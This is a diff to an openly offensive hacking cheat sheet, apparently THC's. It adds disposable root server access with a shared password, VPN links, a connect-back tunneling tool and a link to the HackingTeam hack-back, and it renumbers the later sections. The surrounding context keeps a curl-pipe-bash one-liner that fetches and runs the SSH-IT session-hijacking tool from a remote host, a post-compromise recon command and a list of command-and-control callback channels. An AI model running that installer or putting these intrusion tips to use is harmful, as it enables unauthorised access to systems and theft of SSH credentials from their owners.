@@ -69,6 +69,9 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [with script](#ssswos-anchor)
    1. [with a wrapper script](#ssswor-anchor)
    1. [with SSH-IT](#sshit-anchor)
+1. [VPN and Shells](#shell)
+   1. [Disposable Root Servers](#shell)
+   1. [VPN Providers](#vpn)
 1. [Post Compromise](#post-hack)
    1. [Find out Linux Distribution](#post-hack)
 1. [Miscellaneous](#misc-anchor)
@@ -916,15 +919,33 @@ The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-i
 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
+---
+<a id="shell"></a>
+**10.i. Disposable Root Servers**
+
+```console
+$ ssh root@segfault.net # Use password 'segfault'
+```
+
+https://thc.org/segfault
+
+<a id="vpn"></a>
+**10.ii. VPN**
+
+1. https://www.mullvad.net
+1. https://www.cryptostorm.is
+
+---
 <a id="post-hack"></a>
-**10.i. Find out Linux Distribution**
+**11.i. Find out Linux Distribution**
 
 ```sh
 uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
 ```
 
+---
 <a id="osint-anchor"></a>
-**11.i. Intelligence Gathering**
+**12.i. Intelligence Gathering**
 
 | OSINT Hacker Tools ||
 | --- | --- |
@@ -948,7 +969,7 @@ uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version
 | https://osintframework.com/ | Many OSINT tools |
 
 <a id="Tools"></a>
-**11.ii. Tools**
+**12.ii. Tools**
 
 Comms
 1. https://www.cs.email/ - Disposable emails (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
@@ -986,11 +1007,12 @@ Callback / Command And Control
 1. https://api.telegram.org
 
 Tunneling
+1. [TCP Gender Changer](https://tgcd.sourceforge.net/) for all your 'connect back' needs.
 1. [ngrok](https://ngrok.com/download) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.
 
  
 <a id="cool-anchor"></a>
-**11.iii. Cool Linux commands**
+**12.iii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
@@ -998,7 +1020,7 @@ Tunneling
 
 
 <a id="tmux-anchor"></a>
-**11.iv. tmux**
+**12.iv. tmux**
 
 | | Tmux Cheat Sheet |
 | --- | --- |
@@ -1008,7 +1030,7 @@ Tunneling
 | Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |
 
 <a id="useful-anchor"></a>
-**11.v. Useful commands**
+**12.v. Useful commands**
 
 Use ```lsof -Pni``` or ```netstat -antpu``` (or ```ss -antpu```) to list all Internet (_-tu_) connections.
 
@@ -1033,9 +1055,13 @@ rlwrap --always-readline ssh user@host
 ```
 ---
 <a id="others"></a>
-## 12. Other Sites
+## 13. Other Sites
 
+1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
 1. https://book.hacktricks.xyz/welcome/readme
 1. https://github.com/yeyintminthuhtut/Awesome-Red-Teaming
 
+---
 Shoutz: ADM, subz/#9x, DrWho, spoty
+Join us on [Telegram](https://t.me/thcorg).
+
